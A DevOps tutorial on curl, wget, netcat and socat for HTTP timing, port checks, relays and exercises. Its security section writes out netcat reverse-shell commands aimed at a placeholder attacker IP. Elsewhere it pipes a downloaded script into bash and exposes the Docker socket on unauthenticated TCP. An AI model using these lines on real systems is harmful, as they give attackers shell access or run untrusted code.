# Network Diagnostics with Curl, Wget, Netcat, and Socat

| Metadata | Details |
| :--- | :--- |
| **Topic** | Network Probing, HTTP Diagnostics, Stream Relaying, and Socket Manipulation |
| **Module** | `04-networking` |
| **Track** | `04-devops/linux` |
| **Prerequisites** | `04-networking/01-networking-basics.md`, `04-networking/03-dns-resolution-and-tools.md` |
| **Target Audience** | DevOps Engineers, SREs, Systems Architects, Backend Engineers |
| **Target Distribution** | Ubuntu 24.04 LTS, Rocky Linux / RHEL 9.4 |
| **Key Tools** | `curl`, `wget`, `nc` (netcat-openbsd), `socat` |

---

## Table of Contents
1. [What & Why](#what--why)
2. [Core Concepts](#core-concepts)
3. [Internal Working](#internal-working)
4. [Syntax & CLI Tools](#syntax--cli-tools)
5. [Progressive Practical Examples](#progressive-practical-examples)
6. [Best Practices](#best-practices)
7. [Common Mistakes & Gotchas](#common-mistakes--gotchas)
8. [Performance, Security & Cost Implications](#performance-security--cost-implications)
9. [Comparison Table / Alternatives](#comparison-table--alternatives)
10. [Real-World Troubleshooting & Interview Q&A](#real-world-troubleshooting--interview-qa)
11. [Hands-On Practice Exercises](#hands-on-practice-exercises)
12. [Summary Cheat Sheet & Further Reading](#summary-cheat-sheet--further-reading)

---

## What & Why

In production Linux environments, engineers constantly need to test endpoints, download assets, probe open ports, simulate client connections, and bridge disparate network protocols. Four command-line tools form the core toolkit of every sysadmin and SRE:

1. **`curl`**: The standard command-line data transfer tool supporting HTTP/HTTPS, FTP, gRPC, and LDAP. Its format-string output engine (`-w`) enables microsecond-level timing analysis of DNS, TCP handshake, TLS negotiation, and TTFB (Time to First Byte).
2. **`wget`**: The non-interactive command-line file downloader designed for recursive web crawling, interrupted download resumption, and reliable mirror backups.
3. **`netcat` (`nc`)**: Known as the "TCP/IP Swiss Army Knife." It reads and writes raw data across arbitrary TCP or UDP sockets, useful for banner grabbing, quick port scanning, and pipe streaming.
4. **`socat`**: "Socket Cat" — an advanced bidirectional stream relay that connects virtually anything to anything: TCP sockets to Unix domain sockets, PTYs to serial ports, and SSL proxies to plaintext endpoints.

Mastering these four tools equips engineers to isolate whether an outage stems from DNS delays, slow TCP handshakes, TLS negotiation failures, or application backend bottlenecks.

---

## Core Concepts

### HTTP Diagnostic Metrics with `curl`
When analyzing web application performance, `curl` dissects connection phases via internal variables:
- `time_namelookup`: Time in seconds from start until DNS resolution completes.
- `time_connect`: Time from start until TCP 3-way handshake to the remote host completes.
- `time_appconnect`: Time from start until SSL/TLS handshake completes.
- `time_pretransfer`: Time from start until file transfer is just about to begin.
- `time_starttransfer`: Time from start until server returns the very first byte (**TTFB**).
- `time_total`: Total duration of the complete request-response cycle.

### Netcat Variants: OpenBSD vs Traditional
Linux distributions provide two main implementations of `nc`:
- `netcat-openbsd`: The modern, security-conscious standard on Debian/Ubuntu/RHEL. Supports IPv6, Unix domain sockets (`-U`), and proxying, but omits the dangerous `-e` (execute shell) option.
- `netcat-traditional` (Hobbit 1995): Historical version often containing the `-e` flag (frequently exploited in reverse shells).

### Socat Stream Abstraction
Unlike `nc`, which connects standard input/output to a single network socket, `socat` establishes a bidirectional pipe between **two address specifications**:
```text
socat [options] <address1> <address2>
```
Addresses can be:
- Network sockets: `TCP4:host:port`, `TCP4-LISTEN:port`, `UDP:host:port`
- Unix Domain Sockets: `UNIX-CONNECT:/path.sock`, `UNIX-LISTEN:/path.sock`
- Standard I/O: `STDIN`, `STDOUT`, `-`
- Execution: `EXEC:command`, `SYSTEM:command`
- Encrypted channels: `OPENSSL:host:port`, `OPENSSL-LISTEN:port`

---

## Internal Working

```
+-----------------------------------------------------------------------------------------+
|                                    Curl Request Lifecycle                               |
+-----------------------------------------------------------------------------------------+
| [0.000s] Client invokes curl                                                            |
|    |                                                                                    |
|    |--- DNS Query (getaddrinfo) ---------------------> [time_namelookup: 0.025s]        |
|    |                                                                                    |
|    |--- TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK) -> [time_connect: 0.050s]           |
|    |                                                                                    |
|    |--- TLS 1.3 Handshake (Client/Server Hello) -----> [time_appconnect: 0.085s]        |
|    |                                                                                    |
|    |--- Client sends HTTP GET Request ---------------> [time_pretransfer: 0.086s]      |
|    |                                                                                    |
|    |<-- Server processes request & returns 1st byte -> [time_starttransfer / TTFB: 0.150s]|
|    |                                                                                    |
|    |<-- Full Response Body Downloaded ---------------> [time_total: 0.180s]             |
+----+------------------------------------------------------------------------------------+
```

### The Socat Relaying Engine
`socat` opens two bidirectional file descriptors ($FD_1$ and $FD_2$) and runs an internal event loop using `poll(2)` or `select(2)`:
```
           +-----------+    read(FD1) / write(FD2)    +-----------+
Address 1  |   FD 1    | ==========================>  |   FD 2    | Address 2
(TCP:8080) |           | <==========================  |           | (UNIX:/run/app.sock)
           +-----------+    read(FD2) / write(FD1)    +-----------+
```
Data received from Address 1 is immediately forwarded to Address 2, and vice versa. It handles protocol translation, byte counting, buffer flushing, and graceful teardown upon EOF.

---

## Syntax & CLI Tools

### Essential `curl` Operations
```bash
# Basic GET request printing headers and body
curl -i https://httpbin.org/get

# Fetch headers only (HEAD request)
curl -I https://httpbin.org/get

# POST JSON payload with custom headers
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer my-jwt-token" \
  -d '{"name": "Alice", "role": "DevOps"}'

# Follow HTTP 301/302 redirects automatically (-L) and silent mode (-s)
curl -sL https://google.com

# Download file saving with remote filename (-O) and progress meter
curl -O https://example.com/archive.tar.gz

# Ignore self-signed TLS/SSL certificates (-k / --insecure) - USE FOR DEBUG ONLY
curl -k https://internal-staging.dev

# Resolve domain to specific IP overriding DNS (--resolve)
curl --resolve "api.prod.com:443:10.0.1.50" https://api.prod.com/health
```

### Essential `wget` Operations
```bash
# Download file to current directory
wget https://example.com/dataset.zip

# Resume an interrupted / partially downloaded file (-c / --continue)
wget -c https://example.com/large_image.iso

# Download in background silently (-b)
wget -b https://example.com/dump.sql

# Recursive mirror download of a website (depth 2)
wget -r -l 2 --no-parent https://docs.example.com/

# Download and output directly to stdout (-O -)
wget -qO- https://example.com/script.sh | bash
```

### Essential `netcat` (`nc`) Operations
```bash
# Check if a remote TCP port is open (Zero I/O mode: -z, timeout: -w)
nc -zv 192.168.1.50 22

# Banner grabbing (connect and receive greeting)
nc -v -w 3 mail.example.com 25

# Listen on a TCP port
nc -l -p 9000

# Listen on a UDP port (-u)
nc -u -l -p 9000

# Connect to a local Unix Domain Socket (-U)
nc -U /run/systemd/journal/stdout
```

### Essential `socat` Operations
```bash
# Forward local port 8080 to remote port 80
socat TCP-LISTEN:8080,fork TCP:example.com:80

# Forward local TCP port to a local Unix Domain Socket (e.g. Docker daemon)
socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock

# Intercept and log plaintext traffic between two endpoints
socat -v TCP-LISTEN:9000,fork TCP:backend-server:8000
```

---

## Progressive Practical Examples

### Example 1: Precision HTTP Latency Profiling with `curl -w`
A production-grade timing profile script measuring DNS, TCP, TLS, and TTFB latency components.

```bash
#!/usr/bin/env bash
set -euo pipefail

URL="${1:-https://www.google.com}"

curl -s -o /dev/null -w "
=============================================
Request Metrics for: %{url_effective}
=============================================
HTTP Status Code:        %{http_code}
DNS Lookup Duration:     %{time_namelookup} s
TCP Connect Duration:    %{time_connect} s
TLS Handshake Duration:  %{time_appconnect} s
Pre-Transfer Duration:   %{time_pretransfer} s
Start Transfer (TTFB):   %{time_starttransfer} s
---------------------------------------------
Total Duration:          %{time_total} s
Download Size:           %{size_download} bytes
Speed:                   %{speed_download} bytes/s
=============================================
" "${URL}"
```

### Example 2: Bypassing DNS and Testing SNI Virtual Hosts with `curl --resolve`
When deploying a new web server or CDN endpoint before updating public DNS records, test the specific IP directly while presenting the correct TLS Server Name Indication (SNI) and `Host:` header.

```bash
# Format: --resolve <hostname>:<port>:<ip>
curl -v --resolve "api.mycompany.com:443:192.168.1.100" \
  https://api.mycompany.com/v1/health

# Verify in verbose output:
# * Added api.mycompany.com:443:192.168.1.100 to address cache
# * Connecting to 192.168.1.100:443...
# * Connected to api.mycompany.com (192.168.1.100) port 443
# * SSL connection using TLSv1.3
```

### Example 3: Ad-Hoc File Transfer via Netcat
When transferring a file between two air-gapped servers where SSH, SCP, or FTP are unavailable or blocked.

```bash
# 1. On Receiving Host (Server A, IP 10.0.0.10):
# Listen on port 7777 and redirect incoming stream to disk
nc -l -p 7777 > /storage/received_archive.tar.gz

# 2. On Sending Host (Server B):
# Stream file directly into the open socket
nc -w 3 10.0.0.10 7777 < /data/backup.tar.gz

# 3. Verify checksums match on both sides upon completion!
```

### Example 4: Creating a Local SSL-Terminating Proxy with `socat`
A developer wants to connect an insecure legacy CLI tool speaking plaintext HTTP to an external HTTPS-only API endpoint.

```bash
# Socat listens on local plaintext port 8000 and tunnels to external HTTPS port 443
socat TCP-LISTEN:8000,fork OPENSSL:api.external.com:443,verify=1

# Now local tools can make requests to plaintext http://localhost:8000/
# and socat encrypts and proxies them over TLS!
```

### Example 5: Building a Resilient API Healthcheck Prober with Retry Logic
Production script utilizing `curl` with exponential backoff and timeout safeguards for Kubernetes init-containers or deploy scripts.

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET_ENDPOINT="https://api.internal.service/health"
MAX_TIME_SEC=30
CONNECT_TIMEOUT_SEC=3
RETRY_COUNT=5

echo "==> Probing service health at ${TARGET_ENDPOINT}..."

if curl --fail \
        --silent \
        --show-error \
        --connect-timeout "${CONNECT_TIMEOUT_SEC}" \
        --max-time "${MAX_TIME_SEC}" \
        --retry "${RETRY_COUNT}" \
        --retry-delay 2 \
        --retry-max-time 20 \
        --retry-connrefused \
        -o /dev/null \
        "${TARGET_ENDPOINT}"; then
    echo "SUCCESS: Service is healthy and responsive."
    exit 0
else
    echo "FAILURE: Service did not become healthy within retry threshold."
    exit 1
fi
```

---

## Best Practices

1. **Always Enforce `--max-time` (`-m`) and `--connect-timeout` in Scripts**: Never call `curl` inside automated scripts without timeouts. If a remote host silently drops packets, `curl` can hang for up to 300 seconds, locking background workers and CI/CD pipelines.
2. **Use `--fail` (`-f`) for Error Detection in Bash**: By default, `curl` exits with status `0` even if the server returns `404 Not Found` or `500 Internal Server Error`. Adding `-f` (or `--fail-with-body`) causes `curl` to return a non-zero exit code on HTTP $4xx$ or $5xx$ responses.
3. **Prefer `curl --resolve` Over Modifying `/etc/hosts` in CI/CD**: Adding mock domain overrides to `/etc/hosts` pollutes global node state and risks lingering test IPs. `curl --resolve` restricts the mapping strictly to the lifecycle of that single command.
4. **Avoid Plaintext `nc` for Sensitive Data Transfers Across Untrusted Networks**: `nc` streams raw bytes with zero encryption. If transferring secrets or archives across public internet or shared VPCs, wrap with `ssh`, `socat OPENSSL`, or `gpg`.
5. **Use `socat` with the `fork` Option on Listeners**: When setting up port forwarders with `socat TCP-LISTEN:...`, always include the `fork` option. Without `fork`, `socat` handles exactly one connection and terminates immediately upon client disconnect.
6. **Use `wget -c` for Resuming Large ISO/Dataset Downloads**: Network interruptions on 50GB downloads are common. Running `wget -c <url>` checks existing byte length on disk and issues an HTTP `Range: bytes=N-` header to resume downloading seamlessly.

---

## Common Mistakes & Gotchas

| Mistake | Why It Fails | Correct Pattern |
| :--- | :--- | :--- |
| Writing `curl http://api.com && echo "Done"` expecting failure on 500 error | `curl` exits with code 0 on any successful TCP/HTTP exchange, including HTTP 404/500. | Use `curl -f` or `curl --fail` to force non-zero exit on HTTP errors. |
| Forgetting `-sL` when querying shortened or redirected URLs | `curl` outputs the empty 301 Moved response and stops without fetching target content. | Use `curl -L` (`--location`) to follow redirects. |
| Using `netcat -z` without timeout (`-w`) | In case of dropped packets (firewall blackhole), `nc` can hang indefinitely. | Always specify a timeout: `nc -zv -w 3 <host> <port>`. |
| Running `socat TCP-LISTEN:8080 TCP:backend:80` without `,fork` | Terminates permanently after the very first client disconnects. | Use `socat TCP-LISTEN:8080,fork TCP:backend:80`. |
| Sending JSON with single quotes via `-d` in Bash | Unescaped single quotes break shell parsing or send malformed JSON to APIs. | Use `-d '{"key":"value"}'` or pass data from a file: `-d @payload.json`. |
| Leaving `wget` recursive downloads unbounded (`wget -r`) | Crawls entire internet if external links are followed; fills disk and triggers IP bans. | Constrain depth and parent domain: `wget -r -l 2 --no-parent`. |

---

## Performance, Security & Cost Implications

### Performance
- **Connection Pooling**: In high-performance microservices, calling `curl` via shell subprocesses creates a brand-new TCP connection and TLS handshake for every query. Application-level HTTP client libraries (e.g., Python `httpx`, Go `net/http`) maintain persistent connection pools, reducing latency by **80%**.
- **Buffer Tuning in `socat`**: By default, `socat` uses small 8KB read/write buffers. When piping gigabit streams, tune buffer sizes using `rcvbuf` and `sndbuf` parameters (e.g., `socat -b 65536 ...`).

### Security
- **Bypassing Certificate Verification (`-k` / `--insecure`)**: Disabling TLS verification leaves the connection vulnerable to Man-in-the-Middle (MitM) attacks. In production, pass custom internal CA root bundles using `--cacert /etc/ssl/certs/corp-ca.crt` rather than disabling validation.
- **Reverse Shell Risk with Netcat**: Attackers frequently use `nc -e /bin/sh <attacker_ip> <port>` or named pipes (`mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ... > /tmp/f`) to establish reverse shells. System hardening tools (SELinux, AppArmor, `auditd`) should monitor socket execution of shells.

### Cost
- In automated healthcheck monitors, querying large endpoints with full payload downloads wastes cloud egress bandwidth. Use `curl -I` (HEAD request) or send `Range: bytes=0-0` headers to verify server health without downloading megabytes of body data.

---

## Comparison Table / Alternatives

| Feature / Dimension | `curl` | `wget` | `netcat` (`nc`) | `socat` |
| :--- | :--- | :--- | :--- | :--- |
| **Primary Scope** | Multi-protocol URL transfer & API probing | Recursive web file downloading & mirroring | Raw Layer 4 TCP/UDP socket manipulation | Multi-purpose bidirectional stream relay |
| **Supported Protocols** | HTTP, HTTPS, FTP, SFTP, LDAP, gRPC, MQTT | HTTP, HTTPS, FTP | Raw TCP, UDP, Unix Sockets | Raw TCP, UDP, SSL, Unix Sockets, PTY, EXEC |
| **Recursive Mirroring**| No | **Yes** (`-r`, `-m`) | No | No |
| **Timing & Diagnostics**| **Outstanding** (`-w` format variables) | Basic | Connection success/fail only | Data dump & byte counts |
| **Forking Listener** | No | No | Single-connection (`-l`) | **Yes** (`fork` parameter) |
| **Standard Distro Availability**| Ubiquitous (default in base images)| Ubiquitous | Ubiquitous | Package install required |

---

## Real-World Troubleshooting & Interview Q&A

### Q1: How do you identify whether high API latency is caused by DNS, TLS negotiation, or server-side processing?
<details>
<summary>View Solution</summary>

Use `curl -w` to break down the request phases:
```bash
curl -w "DNS: %{time_namelookup}s | TLS: %{time_appconnect}s | TTFB: %{time_starttransfer}s | Total: %{time_total}s\n" \
  -o /dev/null -s https://api.example.com
```
**Interpretation**:
- If `time_namelookup` is high (> 100ms): The upstream DNS resolver is slow or failing.
- If `time_appconnect - time_connect` is high: TLS negotiation / cryptographic handshake is bottlenecked.
- If `time_starttransfer - time_appconnect` is high: **The backend server is slow** (database query delay, CPU lock, or slow application processing) before returning the first byte.
</details>

### Q2: What causes `curl: (35) error:0A000410:SSL routines::sslv3 alert handshake failure`?
<details>
<summary>View Solution</summary>

This error indicates that the TLS handshake failed during cipher suite or protocol negotiation.
Common reasons:
1. **Cipher Mismatch**: The client and server share no overlapping cipher suites.
2. **TLS Version Mismatch**: The server requires TLS 1.3, but the client only supports TLS 1.2 or older.
3. **Missing SNI**: The server hosts multiple virtual hosts and terminates connections if the client does not provide the Server Name Indication.
Diagnose by forcing specific TLS versions: `curl -v --tlsv1.3 https://target.com`.
</details>

### Q3: How can you quickly test if a remote UDP port is open using `nc`?
<details>
<summary>View Solution</summary>

Unlike TCP (which returns `SYN-ACK` or `RST`), UDP is connectionless. If no application is listening, the remote host *may* emit an ICMP "Port Unreachable" packet, but if a firewall drops it, the port appears open.

To test UDP with `nc`:
```bash
nc -z -v -u -w 3 192.168.1.50 53
```
*Note*: The most reliable test is sending a protocol-specific payload (e.g., a real DNS query or NTP packet) and verifying whether a valid protocol reply is returned.
</details>

### Q4: What is the difference between `curl -s` and `curl -S`?
<details>
<summary>View Solution</summary>

- `-s` (`--silent`): Mutes all output, including the progress meter and **error messages**. If the connection fails (e.g., DNS error, connection refused), `curl` exits silently with no output.
- `-S` (`--show-error`): When used in combination with `-s` (`curl -sS`):
  It keeps the progress meter hidden, but **prints error messages** to stderr if the transfer fails.
  *Best Practice*: Always use `-sS` in automated scripts.
</details>

### Q5: How do you forward a local port to a remote service through an intermediary jump host using `socat`?
<details>
<summary>View Solution</summary>

On the intermediary jump host, run:
```bash
socat TCP4-LISTEN:5432,fork,reuseaddr TCP4:internal-db.prod:5432
```
Now, any client connecting to port 5432 on the jump host is transparently forwarded to `internal-db.prod:5432`.
</details>

### Q6: How do you resume a failed 10GB download without restarting from byte zero?
<details>
<summary>View Solution</summary>

- **Using `wget`**:
  ```bash
  wget -c https://example.com/huge_file.iso
  ```
- **Using `curl`**:
  ```bash
  curl -C - -O https://example.com/huge_file.iso
  ```
  (`-C -` tells curl to automatically inspect the size of the existing local file and request byte range starting from that offset).
</details>

### Q7: Why does `curl -X GET -d "param=value" http://example.com` unexpectedly send a POST request on some servers?
<details>
<summary>View Solution</summary>

Using the `-d` (`--data`) flag automatically causes `curl` to set the HTTP method to **POST** and sets the `Content-Type: application/x-www-form-urlencoded` header. 
Even if you explicitly specify `-X GET`, some HTTP proxies and web servers inspect the presence of a request body and process the request as a POST or reject it with `400 Bad Request`. To append data to a GET request properly, use URL query parameters: `http://example.com?param=value` or use `curl -G -d "param=value"`.
</details>

### Q8: How can you intercept and inspect raw plaintext traffic flowing into a Unix domain socket?
<details>
<summary>View Solution</summary>

Use `socat` with the `-v` (verbose) flag as a man-in-the-middle proxy:
```bash
# Rename the original socket temporarily
mv /run/app.sock /run/app.sock.original

# Start socat proxy listening on the expected socket and forwarding to original
sudo socat -v UNIX-LISTEN:/run/app.sock,fork,mode=666 UNIX-CONNECT:/run/app.sock.original
```
`socat` prints every byte exchanged in both directions directly to stdout in real-time.
</details>

---

## Hands-On Practice Exercises

### Exercise 1: Profiling HTTP Response Times with `curl`
**Task**: Measure the DNS, TCP handshake, TLS negotiation, and TTFB times for `https://cloudflare.com` using `curl -w`.
<details>
<summary>View Solution</summary>

```bash
curl -s -o /dev/null -w "DNS: %{time_namelookup}s | TCP: %{time_connect}s | TLS: %{time_appconnect}s | TTFB: %{time_starttransfer}s | Total: %{time_total}s\n" https://cloudflare.com
```
</details>

### Exercise 2: Building an Ad-Hoc Port Scanner with Netcat
**Task**: Scan ports 20 through 25 on `127.0.0.1` using `nc` with a 1-second timeout per port.
<details>
<summary>View Solution</summary>

```bash
nc -z -v -w 1 127.0.0.1 20-25
```
</details>

### Exercise 3: Simulating an Echo Server with `socat`
**Task**: Use `socat` to launch an echo server on local port `7070` that repeats back whatever text a client sends. Connect to it with `nc`.
<details>
<summary>View Solution</summary>

```bash
# 1. Start echo server in background
socat TCP-LISTEN:7070,fork EXEC:/bin/cat &
SERVER_PID=$!

# 2. Connect with netcat and send text
echo "Hello Socat" | nc 127.0.0.1 7070
# Returns: Hello Socat

# 3. Clean up
kill "${SERVER_PID}"
```
</details>

### Exercise 4: Testing API Endpoints with Custom Headers and JSON
**Task**: Use `curl` to make a POST request to `https://httpbin.org/post` passing custom headers `X-Debug: true` and a JSON payload `{"status": "ok"}`.
<details>
<summary>View Solution</summary>

```bash
curl -s -X POST https://httpbin.org/post \
  -H "Content-Type: application/json" \
  -H "X-Debug: true" \
  -d '{"status": "ok"}' | jq '.json, .headers'
```
</details>

### Exercise 5: Resuming Interrupted Downloads with `wget`
**Task**: Start downloading a large test file with `wget`. Intercept and terminate it prematurely with `kill`. Resume the download using `-c`.
<details>
<summary>View Solution</summary>

```bash
mkdir -p /tmp/wget-test && cd /tmp/wget-test

# 1. Start download of Ubuntu ISO in background
wget https://releases.ubuntu.com/24.04/ubuntu-24.04-live-server-amd64.iso &
WGET_PID=$!
sleep 2

# 2. Kill the process mid-transfer
kill -9 "${WGET_PID}" 2>/dev/null || true

# 3. Check partial file exists
ls -lh *.iso

# 4. Resume download
wget -c https://releases.ubuntu.com/24.04/ubuntu-24.04-live-server-amd64.iso &
RESUME_PID=$!
sleep 2
kill -9 "${RESUME_PID}" 2>/dev/null || true

# 5. Clean up
rm -rf /tmp/wget-test
```
</details>

### Exercise 6: Bridging a TCP Port to a Unix Domain Socket with `socat`
**Task**: Create a dummy Unix domain socket using `nc -l -U`. Use `socat` to expose that Unix socket on TCP port `9999`. Send data over TCP and verify it reaches the Unix socket.
<details>
<summary>View Solution</summary>

```bash
SOCKET="/tmp/test_stream.sock"

# 1. Listen on Unix socket
nc -l -U "${SOCKET}" &
NC_PID=$!

# 2. Bridge TCP port 9999 to the Unix socket
socat TCP-LISTEN:9999,fork UNIX-CONNECT:"${SOCKET}" &
SOCAT_PID=$!

# 3. Send message via TCP
echo "Bridged Stream Message" | nc 127.0.0.1 9999

# 4. Clean up
kill "${SOCAT_PID}" "${NC_PID}" 2>/dev/null || true
rm -f "${SOCKET}"
```
</details>

---

## Summary Cheat Sheet & Further Reading

### Command Reference
| Operation | Command Example |
| :--- | :--- |
| **Inspect HTTP Headers** | `curl -I -s https://example.com` |
| **JSON POST Request** | `curl -X POST -H "Content-Type: application/json" -d '{"k":"v"}' <url>` |
| **Timing Latency Profile**| `curl -s -o /dev/null -w "%{time_total}s\n" <url>` |
| **Bypass DNS (SNI Test)** | `curl --resolve "site.com:443:10.0.0.5" https://site.com` |
| **Resume Download (wget)**| `wget -c https://example.com/file.zip` |
| **Mirror Site (wget)** | `wget -r -l 2 --no-parent https://example.com/` |
| **Probe Open TCP Port** | `nc -zv -w 2 10.0.0.1 443` |
| **Banner Grab** | `nc -v -w 3 10.0.0.1 22` |
| **Port Forwarder (socat)**| `socat TCP-LISTEN:8080,fork TCP:remote:80` |
| **TCP to Unix Socket** | `socat TCP-LISTEN:2375,fork UNIX-CONNECT:/run/docker.sock` |

### Further Reading
- `man 1 curl` and [curl Tutorial / Book (Everything curl)](https://everything.curl.dev/)
- `man 1 wget` and `man 1 nc`
- `man 1 socat` and [Socat Official Documentation](http://www.dest-unreach.org/socat/doc/socat.html)
- [HTTP/1.1 and HTTP/2 Protocol Specifications - IETF](https://datatracker.ietf.org/doc/html/rfc9110)
